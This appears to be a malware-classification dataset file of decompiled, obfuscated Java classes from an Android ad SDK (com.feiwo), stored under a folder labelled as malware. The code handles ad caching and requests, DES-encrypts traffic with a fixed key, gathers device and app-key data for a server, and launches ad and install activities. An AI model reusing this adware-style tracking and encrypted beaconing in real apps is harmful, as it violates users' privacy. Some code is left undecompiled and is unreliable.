com.feiwo.d.e.a(a2,b3);   }   public void a(  i iVar,  RootNode<?> rootNode,  List<?> list,  int i){     if (list != null) {     }     iVar.j().a(com.feiwo.c.a.u,list,i);   }   protected boolean a(){     return true;   }   protected RootNode<?> b(  i iVar,  List<AdInfo> list){     List<AdInfo> a2=a(iVar,list);     if (a2 == null) {       return null;     }     RootNode<?> a3=com.feiwo.c.a(iVar.i());     AdNode<?> createAdNode=a3.createAdNode();     if (a2.size() == 0) {       createAdNode.setAdList(new ArrayList());     }  else {       createAdNode=a(iVar,a3,a2);     }     a3.setAd(createAdNode);     return a3;   }   @Override public void b(  i iVar){     List<Action> actions;     boolean z;     String b2=iVar.b();     RootNode<?> f=iVar.f();     com.feiwo.b.a.f j=iVar.j();     if (b2.equals(com.feiwo.c.a.A)) {       RootNode<?> a2=a(iVar,com.feiwo.c.a.u);       if (a2 != null) {         iVar.b(a2);         iVar.a(true);         return;       }       iVar.a(false);       if (f.getAd() == null || f.getAd().getLastAdId() == null || !a()) {         return;       }       f.getAd().setLastAdId(a(iVar).nextRequestAdId);       return;     }     if (!b2.equals(com.feiwo.c.a.C) || (actions=f.getAction().getActions()) == null || actions.size() == 0) {       return;     }     SettingNode c=iVar.d() == null ? com.feiwo.d.e.c(j) : iVar.d().r();     boolean z2=true;     Integer num=0;     int i=0;     while (i < actions.size()) {       Action action=actions.get(i);       int intValue=action.getAction().intValue();       if (c == null) {         break;       }       Integer num2=(c.getDelayActions() == null || c.getDelayActions().get(Integer.valueOf(intValue)) == null) ? num : c.getDelayActions().get(action.getAction());       if (num2 == null || num2.intValue() <= 0) {         z=false;       }  else {         List<ActionExt> a3=a(j);         if (iVar.f().getAction() == null || iVar.f().getAction().getActions() == null) {           iVar.f().setAction(com.feiwo.c.a());         }         ActionExt a4=a(a3,intValue,action.getAdId().intValue());         if (a4 == null) {           ActionExt actionExt=new ActionExt();           actionExt.setAdId(action.getAdId());           actionExt.setAction(action.getAction());           actionExt.setCount(0);           int a5=a(a3,intValue);           if (a5 == 0) {             a5=((int)(v.a() / 1000)) + num2.intValue();           }           actionExt.setExpireDate(a5);           a4=actionExt;         }         a4.setPackageName(action.getPackageName());         a4.setDate(c.getServiceDate());         a4.setCount(Integer.valueOf(a4.getCount().intValue() + 1));         a(j,a3,a4);         List<ActionExt> a6=a(j,intValue,v.a() / 1000);         if (a6.size() != 0) {           z2=false;           iVar.f().getAction().getActions().clear();           iVar.f().getAction().getActions().addAll(a6);           a(j,a6,num2.intValue());         }         z=z2;       }       i++;       z2=z;       num=num2;     }     iVar.a(z2);   }   @Override public void a(  i iVar){     int i;     if (iVar.c()) {       return;     }     com.feiwo.b.a.f j=iVar.j();     String b2=iVar.b();     if (iVar.g() == null) {       if (b2.equals(com.feiwo.c.a.C)) {         List<Action> actions=iVar.f().getAction().getActions();         for (int i2=0; i2 < actions.size(); i2++) {           Action action=actions.get(i2);           int intValue=action.getAction().intValue();           Integer num=0;           SettingNode c=iVar.d() == null ? com.feiwo.d.e.c(j) : iVar.d().r();           if (c == null) {             return;           }           if (c.getDelayActions() != null && c.getDelayActions().get(Integer.valueOf(intValue)) != null) {             num=c.getDelayActions().get(action.getAction());           }           if (num == null || num.intValue() <= 0) {             a(iVar,action.getAction().intValue());           }         }         return;       }       return;     }     if (b2.equals(com.feiwo.c.a.A)) {       if (iVar.d() != null) {         try {           i=Integer.parseInt(iVar.d().r().getCacheExpires());         }  catch (        NumberFormatException e) {           i=0;         }       }  else {         i=Integer.parseInt(j.a().getCacheExpires());       }       if (iVar.g().getAd() == null || iVar.g().getAd().getAdList() == null) {         return;       }       List<?> adList=iVar.g().getAd().getAdList();       a(iVar,iVar.g(),adList,i);       iVar.g().getAd().setAdList(a(iVar,(List<AdInfo>)adList));       return;     }     if (b2.equals(com.feiwo.c.a.C)) {       List<Action> actions2=iVar.f().getAction().getActions();       List<ActionExt> a2=a(j,0,0L);       for (int i3=0; i3 < actions2.size(); i3++) {         Action action2=actions2.get(i3);         Iterator<ActionExt> it=a2.iterator();         while (it.hasNext()) {           ActionExt next=it.next();           if (next.getAction().intValue() == action2.getAction().intValue() && next.getAdId().intValue() == action2.getAdId().intValue()) {             int intValue2=next.getCount().intValue() - action2.getCount().intValue();             if (intValue2 > 0) {               next.setCount(Integer.valueOf(intValue2));             }  else {               it.remove();             }           }         }         a(j,a2);       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\b.code","public class b extends TypeToken<List<ActionExt>> {   final a f126a;   public b(  a aVar){     this.f126a=aVar;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\c.code","public class c implements f<i>, m<i> {   private static final String f127a=com.feiwo.i.c.a.cc;   public static byte[] a(  byte[] bArr,  String str){     NoSuchAlgorithmException e;     SecretKeyFactory secretKeyFactory;     Cipher cipher=null;     DESKeySpec dESKeySpec=new DESKeySpec(str.getBytes());     try {       secretKeyFactory=SecretKeyFactory.getInstance(""DES"");     }  catch (    NoSuchAlgorithmException e2) {       e=e2;       secretKeyFactory=null;     }     try {       cipher=Cipher.getInstance(""DES"");     }  catch (    NoSuchAlgorithmException e3) {       e=e3;       e.printStackTrace();       cipher.init(1,secretKeyFactory.generateSecret(dESKeySpec));       return cipher.doFinal(bArr);     }     cipher.init(1,secretKeyFactory.generateSecret(dESKeySpec));     return cipher.doFinal(bArr);   }   public static byte[] b(  byte[] bArr,  String str){     NoSuchAlgorithmException e;     SecretKeyFactory secretKeyFactory;     Cipher cipher=null;     DESKeySpec dESKeySpec=new DESKeySpec(str.getBytes());     try {       secretKeyFactory=SecretKeyFactory.getInstance(""DES"");     }  catch (    NoSuchAlgorithmException e2) {       e=e2;       secretKeyFactory=null;     }     try {       cipher=Cipher.getInstance(""DES"");     }  catch (    NoSuchAlgorithmException e3) {       e=e3;       e.printStackTrace();       cipher.init(2,secretKeyFactory.generateSecret(dESKeySpec));       return cipher.doFinal(bArr);     }     cipher.init(2,secretKeyFactory.generateSecret(dESKeySpec));     return cipher.doFinal(bArr);   }   @Override public void b(  i iVar){     if (iVar.p() != null && !iVar.c()) {       try {         iVar.b(a(iVar.p(),com.feiwo.c.a.c));       }  catch (      Exception e) {       }     }     if (iVar.c()) {       return;     }     r.a(com.feiwo.i.c.a.j,com.feiwo.i.c.b.a() + iVar.b(),""request:"" + iVar.a());   }   @Override public void a(  i iVar){     if (iVar.k() != 200 || iVar.o() == null || iVar.c()) {       return;     }     try {       iVar.a(b(iVar.o(),com.feiwo.c.a.c));     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\d.code","public class d implements f<i>, m<i> {   private final String f128a=d.class.getSimpleName();   @Override public void b(  com.feiwo.f.a.i r4){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwo.f.a.d.b(com.feiwo.f.a.i):void"");   }   @Override public void a(  i iVar){     GZIPInputStream gZIPInputStream;     if (iVar.c()) {       return;     }     try {       try {         if (iVar.m() != 1) {           if (iVar.o() != null) {             iVar.b(new String(iVar.o(),""UTF-8""));             return;           }           return;         }         ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(iVar.o());         try {           ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();           gZIPInputStream=new GZIPInputStream(byteArrayInputStream);           try {             byte[] bArr=new byte[256];             while (true) {               int read=gZIPInputStream.read(bArr);               if (read < 0) {                 break;               }  else {                 byteArrayOutputStream.write(bArr,0,read);               }             }             iVar.a(byteArrayOutputStream.toByteArray());             if (gZIPInputStream != null) {               try {                 gZIPInputStream.close();               }  catch (              IOException e) {                 e.printStackTrace();               }             }           }  catch (          Throwable th) {             th=th;             if (gZIPInputStream != null) {               try {                 gZIPInputStream.close();               }  catch (              IOException e2) {                 e2.printStackTrace();               }             }             throw th;           }         }  catch (        Throwable th2) {           th=th2;           gZIPInputStream=null;         }       }  catch (      Exception e3) {         e3.printStackTrace();       }     }  catch (    IOException e4) {       e4.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\e.code","public class e implements m<i> {   private final String f129a=e.class.getSimpleName();   private int a(  String[] strArr,  int i){     int i2=i + 1;     if (i2 >= strArr.length) {       return 0;     }     return i2;   }   @Override public void a(  i iVar){     if (iVar.k() == 200 || com.feiwo.i.g.a(iVar.h()) == 0) {       return;     }     String[] strArr=com.feiwo.c.a.m;     String str=strArr[com.feiwo.c.a.l];     for (int i=0; i < 1; i++) {       com.feiwo.i.a.c a2=new com.feiwo.i.a.e(iVar.h(),iVar.i()).a(str,iVar.b(),iVar);       iVar.b(a2.f160a);       iVar.b(a2.c);       if (a2.f160a == 200) {         break;       }     }     if (iVar.k() != 200) {       com.feiwo.c.a.l=a(strArr,com.feiwo.c.a.l);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\f.code","public interface f<T> {   void b(  T t); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\g.code","public interface g {   void a(  h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\h.code","public class h {   public boolean f130a=false;   public int f131b;   public boolean c; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\i.code","public class i {   private com.feiwo.b.a.f f132a;   private Handler f133b;   private Context c;   private String d;   private int e;   private boolean f;   private boolean g;   private int h;   private int i;   private Gson j;   private byte[] k;   private byte[] l;   private int m;   private long n;   private String o;   private RootNode<?> p;   private RootNode<?> q;   private String r;   private String s;   private com.feiwo.d.e<?> u;   private g v;   private boolean t=false;   private boolean w=false;   public i(  Context context,  int i,  String str,  RootNode<?> rootNode){     int i2=0;     a(context);     a(i);     if (i() == 0) {       int[] iArr={1,3,2,4};       while (true) {         if (i2 < iArr.length) {           UserInfo a2=com.feiwo.d.e.a(com.feiwo.d.e.a(context,iArr[i2]));           if (a2 != null && !TextUtils.isEmpty(a2.appKey)) {             a(com.feiwo.d.e.a(context,iArr[i2]));             a(iArr[i2]);             break;           }           i2++;         }  else {           break;         }       }       if (i() == 0) {         a(1);       }     }  else {       a(com.feiwo.d.e.a(context,i));     }     c(str);     a(rootNode);     a(new Gson());   }   public i(  com.feiwo.d.e<?> eVar,  String str,  RootNode<?> rootNode){     a(eVar);     a(eVar.n());     a(eVar.o());     a(eVar.c);     c(str);     a(rootNode);     a(new Gson());   }   public String a(){     return this.r;   }   public void a(  int i){     this.e=i;   }   public void a(  long j){     this.n=j;   }   public void a(  Context context){     this.c=context;   }   public void a(  Handler handler){     this.f133b=handler;   }   public void a(  Gson gson){     this.j=gson;   }   public void a(  com.feiwo.b.a.f fVar){     this.f132a=fVar;   }   public void a(  com.feiwo.d.e<?> eVar){     this.u=eVar;   }   public void a(  g gVar){     this.v=gVar;   }   public void a(  RootNode<?> rootNode){     this.p=rootNode;   }   public void a(  String str){     this.r=str;   }   public void a(  boolean z){     this.t=z;   }   public void a(  byte[] bArr){     this.k=bArr;   }   public String b(){     return this.o;   }   public void b(  int i){     this.m=i;   }   public void b(  RootNode<?> rootNode){     this.q=rootNode;   }   public void b(  String str){     this.s=str;   }   public void b(  boolean z){     this.g=z;   }   public void b(  byte[] bArr){     this.l=bArr;   }   public void c(  int i){     this.h=i;   }   public void c(  String str){     this.o=str;   }   public void c(  boolean z){     this.f=z;   }   public boolean c(){     return this.t;   }   public com.feiwo.d.e<?> d(){     return this.u;   }   public void d(  int i){     this.i=i;   }   public void d(  String str){     this.d=str;   }   public g e(){     return this.v;   }   public RootNode<?> f(){     return this.p;   }   public RootNode<?> g(){     return this.q;   }   public Context h(){     return this.c;   }   public int i(){     return this.e;   }   public com.feiwo.b.a.f j(){     return this.f132a;   }   public int k(){     return this.m;   }   public Handler l(){     return this.f133b;   }   public int m(){     return this.h;   }   public int n(){     return this.i;   }   public byte[] o(){     return this.k;   }   public byte[] p(){     return this.l;   }   public boolean q(){     return this.g;   }   public boolean r(){     return this.f;   }   public String s(){     return this.d;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\j.code","public class j implements f<i>, m<i> {   private final String f134a=j.class.getSimpleName();   @Override public void b(  i iVar){     String b2=iVar.b();     if (iVar.c()) {       iVar.b(200);       return;     }     com.feiwo.i.a.e eVar=new com.feiwo.i.a.e(iVar.h(),iVar.i());     long currentTimeMillis=System.currentTimeMillis();     com.feiwo.i.a.c a2=eVar.a(com.feiwo.i.c.b.a(),b2,iVar);     iVar.a(System.currentTimeMillis() - currentTimeMillis);     iVar.b(a2.f160a);     iVar.a(a2.d);     iVar.c(a2.e);   }   @Override public void a(  i iVar){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\k.code","public class k implements f<i>, m<i> {   private final String f135a=k.class.getSimpleName();   @Override public void b(  i iVar){     Gson gson=new Gson();     RootNode<?> f=iVar.f();     com.feiwo.d.e<?> d=iVar.d();     DeviceNode device=f.getDevice();     if (f.getAd() != null) {       if (f.getAd().getAdType().intValue() == 0) {         f.getAd().setAdType(Integer.valueOf(iVar.i()));       }       if (f.getAd().getLastAdId() == null || !iVar.b().equals(com.feiwo.c.a.A) || !iVar.c()) {       }     }     if (iVar.b().equals(com.feiwo.c.a.A) && f.getAd() != null && f.getAd().getLastAdId().intValue() == 0) {       device=d == null ? com.feiwo.c.a(iVar.h(),com.feiwo.d.e.a(iVar.j()).appKey,true) : d.b(true);     }     DeviceNode a2=device == null ? (d == null || d.q() == null) ? com.feiwo.c.a(iVar.h(),com.feiwo.d.e.a(iVar.j()).appKey,false) : d.b(false) : device;     AppendNode appendNode=d == null ? com.feiwo.d.e.a(iVar.j()).appendNode : d.t().appendNode;     f.setDevice(a2);     f.setAppend(appendNode);     String json=gson.toJson(f);     iVar.d(a2.getAppKey());     iVar.a(json);     iVar.b(json.getBytes());   }   @Override public void a(  i iVar){     RootNode<?> rootNode;     UserInfo t;     com.feiwo.d.e<?> d=iVar.d();     Gson gson=new Gson();     if (!iVar.c()) {       String str=(iVar.k() != 200 || iVar.o() == null || iVar.o().length == 0) ? null : new String(iVar.o());       iVar.b(str);       try {         rootNode=d == null ? (RootNode)gson.fromJson(str,com.feiwo.c.c(iVar.i())) : (RootNode)gson.fromJson(str,d.c().getType());       }  catch (      JsonSyntaxException e) {         e.printStackTrace();         rootNode=null;       }       iVar.b(rootNode);       if (iVar.g() != null) {         if (d == null) {           t=com.feiwo.d.e.a(iVar.j());         }  else {           t=d.t();           d.t().appendNode=iVar.g().getAppend();         }         t.appendNode=iVar.g().getAppend();         com.feiwo.d.e.a(iVar.j(),t);       }     }     if (iVar.g() != null && iVar.k() == 200) {       if (d == null) {         SettingNode setting=iVar.g().getSetting();         if (setting != null) {           iVar.j().a(setting);         }         ExecutionNode execution=iVar.g().getExecution();         if (execution != null && execution.getDeleteAdId() != null) {           int intValue=execution.getDeleteAdId().intValue();           String str2=com.feiwo.c.a.u;           String str3=(iVar.g().getAd() == null || iVar.g().getAd().getShowStyle() == null) ? str2 : str2 + iVar.g().getAd().getShowStyle();           List list=(List)iVar.j().a(str3,com.feiwo.c.b(iVar.i()));           if (list != null && list.size() > 0) {             int parseInt=Integer.parseInt(iVar.j().a().getCacheExpires());             Iterator it=list.iterator();             while (true) {               if (!it.hasNext()) {                 break;               }               AdInfo adInfo=(AdInfo)it.next();               if (adInfo.getAdId().intValue() == intValue) {                 r.a(com.feiwo.i.c.a.i,com.feiwo.i.c.a.k,com.feiwo.i.c.a.bQ + adInfo.getPackageName());                 it.remove();                 break;               }             }             iVar.j().b(str3,list,parseInt);           }         }       }  else       if (d.q() != null) {         if (iVar.g().getSetting() != null) {           d.q().setSetting(iVar.g().getSetting());         }         if (iVar.g().getExecution() != null) {           d.q().setExecution(iVar.g().getExecution());         }  else {           d.q().setExecution(null);         }         d.m();       }     }     h hVar=new h();     hVar.f131b=iVar.k();     hVar.c=iVar.c();     hVar.f130a=iVar.r();     if (iVar.l() != null && iVar.q()) {       iVar.l().post(new l(this,"""",iVar,hVar));     }  else     if (iVar.e() != null) {       iVar.e().a(hVar,iVar.f(),iVar.g());     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\l.code","public class l implements Runnable {   final String f136a;   final i f137b;   final h c;   final k d;   public l(  k kVar,  String str,  i iVar,  h hVar){     this.d=kVar;     this.f136a=str;     this.f137b=iVar;     this.c=hVar;   }   @Override public void run(){     if (this.f137b.e() != null) {       this.f137b.e().a(this.c,this.f137b.f(),this.f137b.g());     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.a\m.code","public interface m<T> {   void a(  T t); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.b\a.code","public class a implements f {   f f140a;   public a(  f fVar){     this.f140a=fVar;   }   @Override public void a(  com.feiwo.d.e eVar,  RootNode rootNode){     if (rootNode.getAd() != null) {     }     if (this.f140a != null) {       this.f140a.a(eVar,rootNode);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.b\b.code","public class b implements f {   f f141a;   public b(  f fVar){     this.f141a=fVar;   }   @Override public void a(  com.feiwo.d.e eVar,  RootNode rootNode){     if (rootNode.getDevice() != null) {     }     if (this.f141a != null) {       this.f141a.a(eVar,rootNode);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.b\c.code","public class c implements f {   f f142a;   private final String f143b=c.class.getSimpleName();   public c(  f fVar){     this.f142a=fVar;   }   @Override public void a(  com.feiwo.d.e<?> eVar,  RootNode<?> rootNode){     RootNode<?> rootNode2;     ExecutionNode execution=rootNode.getExecution();     if (execution != null) {       if (execution.getUpdateAd() != null && execution.getUpdateAd().intValue() == 1) {         r0=0 == 0 ? eVar.f() : null;         AdNode<?> createAdNode=r0.createAdNode();         createAdNode.setAdType(Integer.valueOf(eVar.o()));         createAdNode.setLastAdId(Integer.valueOf(eVar.k()));         r0.setAd(createAdNode);       }       if (execution.getUpdateDevice() != null && execution.getUpdateDevice().intValue() == 1) {         if (r0 == null) {           r0=eVar.f();         }         r0.setDevice(eVar.c(true));       }       if (execution.getDeleteAdId() != null) {         eVar.c(execution.getDeleteAdId().intValue());       }       rootNode2=r0;     }  else {       rootNode2=null;     }     if (rootNode2 != null) {       String str=com.feiwo.c.a.A;       if (rootNode2.getAd() == null) {         str=com.feiwo.c.a.D;       }       eVar.a(new d(this,eVar,str,rootNode2));     }     if (this.f142a != null) {       this.f142a.a(eVar,rootNode);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.b\d.code","public class d implements Runnable {   final com.feiwo.d.e f144a;   final String f145b;   final RootNode c;   final c d;   public d(  c cVar,  com.feiwo.d.e eVar,  String str,  RootNode rootNode){     this.d=cVar;     this.f144a=eVar;     this.f145b=str;     this.c=rootNode;   }   @Override public void run(){     this.f144a.a(this.f145b,this.c,new e(this));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.b\e.code","class e implements com.feiwo.f.a.g {   final d f146a;   public e(  d dVar){     this.f146a=dVar;   }   @Override public void a(  h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.b\f.code","public interface f {   void a(  com.feiwo.d.e<?> eVar,  RootNode<?> rootNode); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.f.b\g.code","public class g implements f {   f f147a;   public g(  f fVar){     this.f147a=fVar;   }   @Override public void a(  com.feiwo.d.e eVar,  RootNode rootNode){     if (rootNode.getSetting() != null) {     }     if (this.f147a != null) {       this.f147a.a(eVar,rootNode);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.g\a.code","public class a implements g {   private static final String f152a=a.class.getName();   private static a f153b;   private Handler c;   private boolean d;   private a(){   }   public static a a(){     if (f153b == null) { synchronized (b.class) {         if (f153b == null) {           f153b=new a();         }       }     }     return f153b;   }   private void a(  Handler handler){     this.c=handler;   }   private boolean a(  RootNode<?> rootNode){     return rootNode == null || rootNode.getAd() == null || rootNode.getAd().getAdList() == null || rootNode.getAd().getAdList().size() == 0;   }   public synchronized void a(  int i,  boolean z,  Handler handler){     a(handler);     this.d=z;     ReDictory.x().a(i,0,this);   }   @Override public void a(  h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2){     Message obtainMessage=this.c.obtainMessage();     if (hVar == null || hVar.f131b != 200) {       if (this.d) {         obtainMessage.what=4100;       }  else {         obtainMessage.what=4098;       }     }  else     if (!a(rootNode2)) {       List<?> adList=rootNode2.getAd().getAdList();       if (this.d) {         obtainMessage.what=FragmentTransaction.TRANSIT_FRAGMENT_FADE;       }  else {         obtainMessage.what=FragmentTransaction.TRANSIT_FRAGMENT_OPEN;       }       List<AppWallAdInfo> a2=c.a(adList);       obtainMessage.arg1=rootNode2.getAd().getIsEnd() == null ? 0 : rootNode2.getAd().getIsEnd().intValue();       obtainMessage.obj=a2;     }  else     if (this.d) {       obtainMessage.what=4100;     }  else {       obtainMessage.what=4098;     }     this.c.sendMessage(obtainMessage);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.g\b.code","public class b implements g {   private static final String f154a=b.class.getName();   private static b f155b;   private Handler c;   private int d;   private int e;   private Context f;   private b(  Context context){     this.f=context;   }   public static b a(  Context context){     if (f155b == null) { synchronized (b.class) {         if (f155b == null) {           f155b=new b(context);         }       }     }     return f155b;   }   private void a(  Handler handler){     this.c=handler;   }   private void a(  List<AppWallAdInfo> list){     List<Map<String,String>> a2=q.a(this.f);     Iterator<AppWallAdInfo> it=list.iterator();     while (it.hasNext()) {       String packageName=it.next().getPackageName();       int i=0;       while (true) {         int i2=i;         if (i2 < a2.size()) {           Iterator<String> it2=a2.get(i2).keySet().iterator();           while (it2.hasNext()) {             if (TextUtils.equals(packageName,a2.get(i2).get(it2.next()))) {               it.remove();               break;             }           }           i=i2 + 1;         }       }     }   }   public synchronized void a(  int i,  int i2,  int i3,  Handler handler){     a(handler);     this.e=i2;     this.d=i;     ReDictory.x().a(0,i3,this);   }   @Override public void a(  h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2){     Message obtainMessage=this.c.obtainMessage();     if (hVar == null || hVar.f131b != 200) {       obtainMessage.what=402;     }  else     if (rootNode2 == null || rootNode2.getAd() == null || rootNode2.getAd().getAdList() == null || rootNode2.getAd().getAdList().size() == 0) {       obtainMessage.what=402;     }  else {       List<AppWallAdInfo> a2=c.a(rootNode2.getAd().getAdList(),this.d,this.e,true);       a(a2);       if (a2.size() == 0) {         obtainMessage.what=402;       }  else {         obtainMessage.what=401;         obtainMessage.obj=a2;       }     }     this.c.sendMessage(obtainMessage);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.h\a.code","public class a implements Comparator {   @Override public int compare(  Object obj,  Object obj2){     return ((AppWallAdInfo)obj2).getIsRecommend() - ((AppWallAdInfo)obj).getIsRecommend();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.h\b.code","public class b {   public static Intent a(  Context context){     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setClass(context,RLA.class);     return intent;   }   public static Intent a(  Context context,  AdInfo adInfo,  String str,  int i){     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setClass(context,RDA.class);     intent.putExtra(com.feiwo.i.c.a.am,adInfo);     intent.putExtra(com.feiwo.i.c.a.an,str);     intent.putExtra(com.feiwo.i.c.a.ao,i);     return intent;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.h\c.code","public class c {   public static synchronized List<AppWallAdInfo> a(  List<AppWallAdInfo> list){     List<AppWallAdInfo> a2; synchronized (c.class) {       a2=a(list,1,0,false);     }     return a2;   }   public static synchronized List<AppWallAdInfo> a(  List<AppWallAdInfo> list,  int i,  int i2,  boolean z){ synchronized (c.class) {       if (z) {         ArrayList arrayList=new ArrayList();         for (int i3=0; i3 < list.size(); i3++) {           AppWallAdInfo appWallAdInfo=list.get(i3);           if (appWallAdInfo.getAdId().intValue() != i2 && arrayList.size() < 4) {             arrayList.add(appWallAdInfo);           }         }         Collections.sort(arrayList,new a());         list=arrayList;       }     }     return list;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\a.code","public class a {   private static final String f=a.class.getSimpleName();   public static final String f156a=com.feiwo.i.c.a.bD;   public static final String f157b=com.feiwo.i.c.a.bE;   public static final String c=com.feiwo.i.c.a.bF;   public static final String d=com.feiwo.i.c.a.bG;   public static final String e=com.feiwo.i.c.a.bH;   public static void a(  Context context,  int i,  IntentData intentData){     if (intentData == null) {       return;     }     if (!(context instanceof Activity)) {       context.startActivity(q.a(context,intentData));       return;     }     String type=intentData.getType();     intentData.getAppDir();     intentData.getAdInfo();     if (type.equals(f157b)) {       context.startActivity(q.b(context,intentData.getAppDir()));       return;     }     if (type.equals(c)) {       Intent intent=new Intent(context,(Class<?>)PA.class);       intent.putExtra(f156a,intentData);       context.startActivity(intent);     }  else     if (type.equals(d)) {       h.a(context).a(i,intentData.getBaseUrl(),intentData.getAdInfo(),new i());     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\b.code","public class b {   public static Animation a(){     TranslateAnimation translateAnimation=new TranslateAnimation(1,-1.0f,1,0.0f,1,0.0f,1,0.0f);     translateAnimation.setDuration(500L);     return translateAnimation;   }   public static Animation b(){     TranslateAnimation translateAnimation=new TranslateAnimation(1,0.0f,1,-1.0f,1,0.0f,1,0.0f);     translateAnimation.setDuration(500L);     return translateAnimation;   }   public static Animation c(){     TranslateAnimation translateAnimation=new TranslateAnimation(1,1.0f,1,0.0f,1,0.0f,1,0.0f);     translateAnimation.setDuration(500L);     return translateAnimation;   }   public static Animation d(){     TranslateAnimation translateAnimation=new TranslateAnimation(1,0.0f,1,1.0f,1,0.0f,1,0.0f);     translateAnimation.setDuration(500L);     return translateAnimation;   }   public static Animation e(){     AlphaAnimation alphaAnimation=new AlphaAnimation(1.0f,0.0f);     alphaAnimation.setDuration(500L);     alphaAnimation.setFillAfter(true);     return alphaAnimation;   }   public static Animation f(){     AlphaAnimation alphaAnimation=new AlphaAnimation(0.0f,1.0f);     alphaAnimation.setDuration(500L);     alphaAnimation.setFillAfter(true);     return alphaAnimation;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.i\c.code","public class c {   public static void a(  Context context,  int i,  AdInfo adInfo,  String str){     if (adInfo != null) {       h.a(context).a(i,str,adInfo,new d(context));     }   }   public static void a(  Context context,  int i,  boolean z,  boolean z2,  boolean z3,  boolean z4,  int i2,  String str,  String str2,  AdInfo adInfo){     Intent intent=new Intent(com.feiwo.c.a.ak);     intent.putExtra(com.feiwo.c.a.al,i);     intent.putExtra(com.feiwo.c.a.am,i2);     intent.putExtra(com.feiwo.c.a.an,z);     intent.putExtra(com.feiwo.c.a.ao,z2);     intent.putExtra(com.feiwo.c.a.ap,z3);     intent.putExtra(com.feiwo.c.a.aq,z4);     intent.putExtra(com.feiwo.c.a.ar,str2);     intent.putExtra(com.feiwo.c.a.as,str);     if (z3 && z4) {       intent.putExtra(com.feiwo.c.a.at,adInfo);     }     context.sendBroadcast(intent);   } } "
